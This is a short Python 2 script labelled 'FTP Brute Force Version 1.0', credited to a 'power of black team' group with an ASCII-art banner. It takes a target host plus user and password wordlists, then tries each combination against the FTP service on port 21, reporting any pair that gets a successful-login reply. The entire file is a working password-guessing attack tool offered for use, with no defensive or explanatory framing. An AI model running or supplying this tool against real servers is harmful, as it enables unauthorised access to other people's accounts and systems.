#!/usr/bin/python
from socket import *
import re
print """
FTP Brute Force Version 1.0
Coded By mohamad javad nikbakht , power of black team

| '_ \ / _ \ \ /\ / / _ \/'|    / _ \| |_  | '_ \| |/ _ | / __| |/ / 
| |_) | (_) \ V  V /  __/ |    | (_) |  _| | |_) | | (_| | (__|   < 
| .__/ \___/ \_/\_/ \___|_|     \___/|_|   |_.__/|_|\__,_|\___|_|\_\ 
|_|

 instagram:power.of.black.team 

  _
 | |_  ___ __    __ __ ___  
 | __ / _ \/ _  |  '_ ` _ \ 
 | | |  /  (_|  | | | | | |
  \ \___| \__,_ |_| |_| |_|
    
"""
host = raw_input("Enter HOST target :")
user = raw_input("Enter userlist : ")
passwd = raw_input("Enter passlist :")
userlist = open(user,"r")
for users in userlist.readlines():
	passlist = open(passwd,"r")
	for passwords in passlist.readlines():
		s = socket(AF_INET,SOCK_STREAM)
		s.connect_ex((host,21))
		s.recv(1024)
		s.send('USER %s\r\n'%(users))
		res = s.recv(1024)
		s.send('PASS %s\r\n'%(passwords))
		res = s.recv(1024)
		if re.search('230',res):
			print "[+] find password ",passwords
		else:
			print "[!] try test","user",users,"psss",passwords
			print "---------------------------------------------"